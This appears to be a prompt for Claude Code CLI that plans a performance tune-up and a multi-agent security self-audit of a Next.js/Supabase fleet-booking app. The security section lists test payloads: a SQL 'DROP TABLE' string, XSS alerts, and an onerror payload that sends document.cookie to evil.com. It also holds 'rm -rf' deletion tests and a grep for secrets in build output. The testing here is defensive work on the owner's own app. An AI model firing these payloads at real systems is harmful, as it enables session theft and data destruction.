# Claude Code CLI — Performance & Security Mega Audit

Paste everything below the line into Claude Code CLI AFTER the V2 implementation is done.

---

## MISSION

This app must be LIGHTNING FAST and IMPENETRABLE before the Monday demo. Two objectives:

1. **Performance:** Get Vercel Speed Insights from 84% → 100. Every millisecond counts.
2. **Security:** 12 parallel attack agents try to BREAK the app. Then fix everything they find.

## READ FIRST

1. `.claude/skills/site-services-webapp/SKILL.md` — architecture rules
2. `.claude/CLAUDE.md` — project structure
3. `next.config.ts` — current build config
4. `src/app/layout.tsx` — root layout (fonts, providers, scripts)
5. `package.json` — dependencies and their sizes

## PHASE 1: PERFORMANCE BLITZ (84% → 100)

Use 5 parallel agents. Each agent owns a specific performance domain.

### Agent P1: Bundle Annihilation
**Goal:** Cut First Load JS from ~160kB to under 100kB per route.

**Tasks:**
1. Install bundle analyzer: `npm install --save-dev @next/bundle-analyzer --legacy-peer-deps`
2. Add to `next.config.ts`:
```typescript
import withBundleAnalyzer from '@next/bundle-analyzer'
const config = withBundleAnalyzer({ enabled: process.env.ANALYZE === 'true' })(nextConfig)
```
3. Run `ANALYZE=true npm run build` — analyze the report
4. **Audit every `'use client'` directive** — if a component doesn't use useState/useEffect/event handlers, remove the directive and make it a Server Component. This is the #1 win.
5. **Move Supabase queries to Server Components** — the Supabase client is ~40KB. If data fetching happens server-side, that 40KB never ships to the browser.
6. **Consolidate excessive chunks** — 157 lazy chunks is too many. Combine related components. Target: 60-80 chunks max.
7. **Tree-shake TanStack Query** — ensure only used hooks are imported, not the entire library.
8. **Check for duplicate dependencies** — `npm ls --all | grep -E "supabase|react-query|zustand"` — eliminate duplicates.
9. **Remove any unused dependencies** from package.json.

**Files:** `next.config.ts`, any component with unnecessary `'use client'`

**Acceptance:** `ANALYZE=true npm run build` shows no route over 100kB First Load JS.

### Agent P2: Core Web Vitals — LCP & FCP
**Goal:** Largest Contentful Paint under 2.0s, First Contentful Paint under 1.5s.

**Tasks:**
1. **Preconnect to Supabase** — add to `layout.tsx`:
```tsx
<link rel="preconnect" href={process.env.NEXT_PUBLIC_SUPABASE_URL} />
```
2. **Font optimization** — verify `next/font` is used with `display: 'swap'` and `fallback` array. NO external Google Fonts CDN requests.
3. **Enable Partial Prerendering (PPR)** — add to `next.config.ts`:
```typescript
experimental: { ppr: 'incremental' }
```
Then add `export const experimental_ppr = true` to key pages (home, fleet, quotes).
4. **Wrap async data sections in Suspense** — every data-fetching section gets its own `<Suspense fallback={<Skeleton />}>` so the static shell renders instantly.
5. **Preload the Al Laith logo** — if it's in the LCP path:
```tsx
<link rel="preload" as="image" href="/assets/al-laith-logo.png" />
```
6. **Use `priority` on above-fold images** — any `<Image>` visible on first paint gets `priority={true}`.
7. **Enable AVIF format** — in `next.config.ts`:
```typescript
images: { formats: ['image/avif', 'image/webp'] }
```

**Files:** `src/app/layout.tsx`, `next.config.ts`, `src/app/page.tsx`, pages with above-fold images

**Acceptance:** Lighthouse LCP < 2.0s, FCP < 1.5s.

### Agent P3: Core Web Vitals — CLS & INP
**Goal:** Cumulative Layout Shift < 0.05, Interaction to Next Paint < 100ms.

**Tasks:**
1. **Audit ALL images for explicit width/height** — every `<Image>` and `<img>` must have `width` and `height` props. No exceptions.
2. **Fix any font-caused layout shift** — verify `next/font` has `adjustFontFallback: true` (default in next/font).
3. **Add `contain: layout style` to repeating list items** — fleet dashboard rows, project cards, quote line items. This tells the browser "changes inside this box don't affect siblings."
4. **Add `content-visibility: auto` to off-screen content** — fleet dashboard rows below the fold, engine status grid tiles that aren't visible on load:
```tsx
style={{ contentVisibility: 'auto', containIntrinsicSize: '100% 80px' }}
```
5. **Audit animations** — ensure all transitions use `transform` and `opacity` only (GPU-accelerated). NO transitions on `width`, `height`, `margin`, `padding` (triggers layout).
6. **Debounce expensive interactions** — any search input, filter change, or scroll handler should be debounced (300ms for search, 16ms for scroll via requestAnimationFrame).
7. **Zustand selector optimization** — every `useStore()` call must use a selector: `useStore(s => s.specificField)` not `useStore()` (subscribes to entire store, triggers re-render on any change).
8. **Enable React Compiler** if Next.js 15 supports it:
```typescript
experimental: { reactCompiler: true }
```

**Files:** All components with images, lists, animations, store subscriptions

**Acceptance:** Lighthouse CLS < 0.05, INP < 100ms.

### Agent P4: Server & Network Optimization
**Goal:** TTFB < 100ms, zero render-blocking resources.

**Tasks:**
1. **Security headers in next.config.ts** (doubles as security + perf — browsers cache aggressively with proper headers):
```typescript
async headers() {
  return [{
    source: '/(.*)',
    headers: [
      { key: 'X-DNS-Prefetch-Control', value: 'on' },
      { key: 'Strict-Transport-Security', value: 'max-age=31536000; includeSubDomains' },
      { key: 'X-Frame-Options', value: 'DENY' },
      { key: 'X-Content-Type-Options', value: 'nosniff' },
      { key: 'Referrer-Policy', value: 'strict-origin-when-cross-origin' },
      { key: 'Permissions-Policy', value: 'camera=(), microphone=(), geolocation=()' },
    ]
  }]
}
```
2. **Disable source maps in production**:
```typescript
productionBrowserSourceMaps: false
```
3. **Cache Supabase queries aggressively** — TanStack Query defaults:
```typescript
defaultOptions: {
  queries: {
    staleTime: 5 * 60 * 1000,  // 5 minutes
    gcTime: 10 * 60 * 1000,    // 10 minutes
    refetchOnWindowFocus: false,
    refetchOnReconnect: false,
  }
}
```
4. **Use Edge Runtime for simple API routes** (health checks, static config):
```typescript
export const runtime = 'edge'
```
5. **Prefetch critical navigation routes** — sidebar links to fleet, quotes, projects should have `prefetch={true}`.
6. **Set image caching to 1 year**:
```typescript
images: { minimumCacheTTL: 31536000 }
```
7. **Verify Vercel Speed Insights is loaded with `lazyOnload` strategy** — if it's render-blocking, it's hurting your score:
```tsx
<Script src="..." strategy="lazyOnload" />
```

**Files:** `next.config.ts`, `src/app/providers.tsx`, API routes

**Acceptance:** TTFB < 100ms on Vercel, no render-blocking resources in Lighthouse.

### Agent P5: Fleet Dashboard Rendering Performance
**Goal:** Fleet dashboard with 763 rows renders in < 500ms, smooth 60fps scroll.

**Tasks:**
1. **Virtual scrolling** — 763 rows is too many to render in DOM. Install `@tanstack/react-virtual` and virtualize the fleet grid:
```bash
npm install @tanstack/react-virtual --legacy-peer-deps
```
Only render rows visible in the viewport + 10 row buffer. This turns 763 DOM nodes into ~40.
2. **Memoize row components** — each fleet row should be wrapped in `React.memo()` with a custom equality check on booking data.
3. **Batch status color calculations** — compute all 763 row colors in a single pass (Map lookup), not per-row during render.
4. **Use CSS `will-change: transform` on the scroll container** — hints GPU compositing.
5. **Lazy-load collapsed categories** — already implemented, verify it works with 763 rows.
6. **Profile with React DevTools Profiler** — identify any component rendering > 16ms.

**Files:** `src/engines/fleet-dashboard/components/calendar-grid.tsx`, `src/engines/fleet-dashboard/components/category-section.tsx`

**Acceptance:** Fleet dashboard with 763 rows: initial render < 500ms, scroll stays at 60fps, no jank.

---

## PHASE 2: SECURITY ASSAULT (12 Parallel Attack Agents)

After Phase 1 completes, spawn 12 agents simultaneously. Each agent ATTACKS the app from a different angle, documents findings, then FIXES what it finds.

Each agent writes:
- `.claude/security-reports/agent-S{N}-{name}.md` — findings + severity + fix applied

### Agent S1: RLS Policy Auditor
**Attack:** Enumerate every table, test every RLS policy for bypass.

**Tasks:**
1. List all tables: `SELECT tablename FROM pg_tables WHERE schemaname = 'public'`
2. Check RLS enabled on ALL: `SELECT tablename, rowsecurity FROM pg_tables WHERE schemaname = 'public' AND NOT rowsecurity`
3. If ANY table has RLS disabled → **CRITICAL** → enable immediately
4. For each table, test with anon key (no auth): `supabase.from('table').select('*')` → should return 0 rows or error
5. Test horizontal access: user A's token requesting user B's records
6. Test vertical access: operator token requesting admin-only data
7. Write migration to fix any gaps:
```sql
ALTER TABLE table_name ENABLE ROW LEVEL SECURITY;
ALTER TABLE table_name FORCE ROW LEVEL SECURITY;
```

**Fix:** Create/fix RLS policies. Add `FORCE ROW LEVEL SECURITY` on every table.

### Agent S2: Authentication Breaker
**Attack:** Brute force, JWT manipulation, session hijacking.

**Tasks:**
1. Test login with 50 rapid incorrect passwords → check if rate-limited
2. If no rate limiting → implement via middleware:
```typescript
// src/middleware.ts — rate limit login attempts
const loginAttempts = new Map<string, { count: number; lastAttempt: number }>()
const MAX_ATTEMPTS = 5
const LOCKOUT_MS = 30 * 60 * 1000 // 30 minutes
```
3. Test JWT: decode token, modify `role` claim, re-send → should be rejected
4. Check session cookie flags: `httpOnly`, `Secure`, `SameSite=Lax`
5. Test password requirements: try `1`, `12`, `123`, `1234` → should enforce minimum 8+ chars
6. Verify tokens expire correctly (check `exp` claim)
7. Add CAPTCHA or exponential backoff after 3 failed attempts

**Fix:** Implement rate limiting middleware, enforce password policy, verify cookie security.

### Agent S3: Authorization Escalation Tester
**Attack:** Operator trying to access admin functions, IDOR attacks.

**Tasks:**
1. Create test data: quote by user A, DN by user B
2. With user A's token, try to read/update/delete user B's quote → must fail
3. With operator token, try to access admin settings endpoints → must fail
4. Test every Server Action with wrong role → verify rejection
5. Check if user can modify their own `role` field via update → must fail
6. Test URL manipulation: change `/quotes/123` to `/quotes/456` (another user's quote)

**Fix:** Add server-side role checks on every mutation. Never trust client role state.

### Agent S4: Input Validation & Injection Tester
**Attack:** SQL injection, XSS, prototype pollution.

**Tasks:**
1. Test every form field with: `'; DROP TABLE quotes; --`
2. Test every form field with: `<script>alert('XSS')</script>`
3. Test every form field with: `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">`
4. Test URL params: `?search=<svg onload=alert(1)>`
5. Test JSON bodies with: `{"__proto__":{"admin":true}}`
6. Test file upload fields with `.exe`, `.js`, malicious SVG
7. Verify all Server Actions validate input with Zod schemas:
```typescript
import { z } from 'zod'
const QuoteSchema = z.object({
  title: z.string().min(1).max(200),
  amount: z.number().positive().max(10_000_000),
  client_id: z.string().uuid(),
})
```
8. Install Zod if not present: `npm install zod --legacy-peer-deps`

**Fix:** Add Zod validation to every Server Action. Sanitize all user inputs.

### Agent S5: API & PostgREST Fuzzer
**Attack:** Flood endpoints, complex queries, large payloads.

**Tasks:**
1. Test with oversized payload (10MB JSON body) → should reject with 413
2. Test with deeply nested Supabase select: `?select=*,project(*,client(*,quotes(*)))` → should limit depth
3. Test with huge limit: `?limit=999999` → should cap at 1000
4. Send 100 rapid concurrent requests to a single endpoint → check if rate-limited
5. Test with malformed JSON bodies
6. Test with missing required fields
7. Implement request size limits in middleware:
```typescript
export function middleware(request: NextRequest) {
  const contentLength = parseInt(request.headers.get('content-length') || '0')
  if (contentLength > 1_048_576) { // 1MB
    return new Response('Payload too large', { status: 413 })
  }
}
```

**Fix:** Add payload size limits, query depth limits, rate limiting.

### Agent S6: Business Logic Attacker
**Attack:** Price manipulation, booking race conditions, document forgery.

**Tasks:**
1. Create a quote via UI, intercept the API call, change the `total` to $0 → submit → check if server recalculates or accepts client total
2. Simultaneously book the same asset for overlapping dates from two sessions → check for race condition
3. Try to change quote status directly from `draft` to `finalised` without going through proper workflow
4. Try to create a DN without a linked quote (when quote is required)
5. Try to set `logistics_in_days` to -999 (negative) → should reject

**Fix:** Server-side price recalculation, `SELECT ... FOR UPDATE` on booking conflicts, input range validation.

### Agent S7: Secrets & Data Exposure Scanner
**Attack:** Find secrets in client bundles, over-fetched API responses.

**Tasks:**
1. Build the app: `npm run build`
2. Search all client chunks for secrets:
```bash
grep -r "service_role\|supabase_service\|PRIVATE\|SECRET\|password\|apikey" .next/static/chunks/ || echo "No secrets found"
```
3. Check that `SUPABASE_SERVICE_ROLE_KEY` is NEVER in any `NEXT_PUBLIC_` variable
4. Verify `productionBrowserSourceMaps: false` in next.config.ts
5. Check API responses: do they return more fields than the UI needs? (e.g., returning user.password_hash)
6. Check error messages: trigger errors and verify no stack traces leak to client
7. Audit localStorage: is anything sensitive stored there?

**Fix:** Strip unnecessary fields from API responses. Disable source maps. Remove any exposed secrets.

### Agent S8: Security Headers Auditor
**Attack:** Check for missing headers that enable attacks.

**Tasks:**
1. Verify these headers exist on all responses:
   - `Strict-Transport-Security: max-age=31536000; includeSubDomains`
   - `X-Frame-Options: DENY`
   - `X-Content-Type-Options: nosniff`
   - `Referrer-Policy: strict-origin-when-cross-origin`
   - `Permissions-Policy: camera=(), microphone=(), geolocation=()`
   - `Content-Security-Policy` (at minimum: `default-src 'self'`)
2. If any missing → add to `next.config.ts` headers function
3. Test for clickjacking: create an iframe pointing to your app → should be blocked
4. Test for MIME sniffing: serve a text file with image content-type → should not execute
5. Verify HTTPS everywhere (no mixed content)

**Fix:** Add all missing security headers to next.config.ts.

### Agent S9: Dependency Vulnerability Scanner
**Attack:** Find vulnerable npm packages.

**Tasks:**
1. Run `npm audit` — document all findings
2. Run `npm outdated` — identify packages needing updates
3. Check for known CVEs in: `next`, `react`, `@supabase/supabase-js`, `@tanstack/react-query`
4. Verify Next.js version is >= 15.2.3 (fixes CVE-2025-29927 middleware bypass)
5. Check for prototype pollution in any `lodash`, `qs`, or deep-merge dependencies
6. Fix all HIGH and CRITICAL vulnerabilities:
```bash
npm audit fix --legacy-peer-deps
```
7. If `npm audit fix` can't resolve: manually update or replace the package

**Fix:** Update all vulnerable dependencies. Pin versions in package.json.

### Agent S10: DDoS & Resource Exhaustion Tester
**Attack:** Try to overwhelm the system.

**Tasks:**
1. Send 500 concurrent requests to `/api/documents/generate-quote` (most expensive endpoint) → check if Vercel throttles correctly
2. Send requests with 100MB file upload attempts → should reject at middleware
3. Open 50 simultaneous Supabase realtime connections → check connection pool
4. Query fleet dashboard with all 763 rows + 2 years of date range → measure response time
5. Trigger garbage collection storms: rapidly create and abandon TanStack Query instances
6. If any endpoint takes > 5s, it needs: caching, pagination, or query optimization

**Fix:** Add rate limiting middleware, query timeouts, connection pool limits.

### Agent S11: Supabase Configuration Hardener
**Attack:** Audit all Supabase settings for misconfigurations.

**Tasks:**
1. Verify RLS on every table:
```sql
SELECT schemaname, tablename, rowsecurity FROM pg_tables WHERE schemaname = 'public';
```
2. Add `FORCE ROW LEVEL SECURITY` on all tables (even superuser must obey RLS):
```sql
ALTER TABLE assets FORCE ROW LEVEL SECURITY;
ALTER TABLE bookings FORCE ROW LEVEL SECURITY;
-- repeat for all 17 tables
```
3. Set query timeouts:
```sql
ALTER DATABASE postgres SET statement_timeout = '30s';
ALTER DATABASE postgres SET idle_in_transaction_session_timeout = '60s';
```
4. Create indexes on all RLS policy columns:
```sql
CREATE INDEX IF NOT EXISTS idx_bookings_user_id ON bookings(user_id);
CREATE INDEX IF NOT EXISTS idx_quotes_user_id ON quotes(user_id);
CREATE INDEX IF NOT EXISTS idx_documents_project_id ON documents(project_id);
```
5. Verify storage buckets are PRIVATE (not public)
6. Disable realtime on tables that don't need it
7. Verify anon key can't access admin-only data

**Fix:** Apply all SQL hardening migrations.

### Agent S12: Integration & Regression Tester
**Attack:** Verify everything still works after all changes.

**Tasks:**
1. `npm run build` — 0 errors, 0 warnings
2. `npm run test` — all tests pass
3. Deletion test: `rm -rf src/engines/fleet-dashboard/ && npm run build` → succeeds → restore
4. Deletion test: `rm -rf src/engines/quote/ && npm run build` → succeeds → restore
5. Visit every page in the app → no blank screens, no console errors
6. Test login flow → redirects work
7. Test quote creation → saves correctly
8. Test fleet dashboard with 763 rows → renders, scrolls smoothly
9. Run Lighthouse: `npx lighthouse https://your-app.vercel.app --output json --output-path lighthouse.json`
10. Verify Speed Insights metrics improved

**Fix:** Any regression found → fix immediately before finalizing.

## EXECUTION ORDER

```
PHASE 1 (parallel):
  Agents P1, P2, P3, P4, P5 — all run simultaneously

PHASE 2 (parallel, after Phase 1):
  Agents S1-S11 — all attack simultaneously

PHASE 3 (sequential, after Phase 2):
  Agent S12 — integration & regression testing

PHASE 4 (final):
  npm run build → npm run test → deletion test → deploy → verify Speed Insights
```

## OUTPUT REQUIREMENTS

After all agents complete, write:

1. **`.claude/security-reports/SUMMARY.md`** — all findings, fixes applied, remaining risks
2. **`.claude/performance-reports/SUMMARY.md`** — before/after metrics, optimizations applied
3. Update **`IMPLEMENTATION-CHECKLIST.md`** — check off completed performance/security items
4. Update **`VERSION-HISTORY.md`** — add v9.1 entry with performance + security hardening

## VERIFICATION TARGETS

| Metric | Before | Target | How to Measure |
|--------|--------|--------|---------------|
| Vercel Speed Insights | 84% | 100% | Vercel dashboard |
| LCP | ~3-4s | < 2.0s | Lighthouse |
| FCP | ~2-3s | < 1.5s | Lighthouse |
| CLS | unknown | < 0.05 | Lighthouse |
| INP | unknown | < 100ms | Lighthouse |
| TTFB | ~300ms | < 100ms | Lighthouse |
| First Load JS | ~160kB | < 100kB | Bundle analyzer |
| Fleet render (763 rows) | unknown | < 500ms | React DevTools |
| RLS coverage | unknown | 100% tables | SQL audit |
| npm audit | unknown | 0 critical/high | npm audit |
| Security headers | unknown | A+ rating | securityheaders.com |
| Vulnerability count | unknown | 0 critical | All agents |

## START NOW

1. Read the 5 files listed above
2. Run Phase 1 (5 performance agents in parallel)
3. After Phase 1: run Phase 2 (12 security agents in parallel)
4. After Phase 2: run Phase 3 (integration testing)
5. Deploy and verify
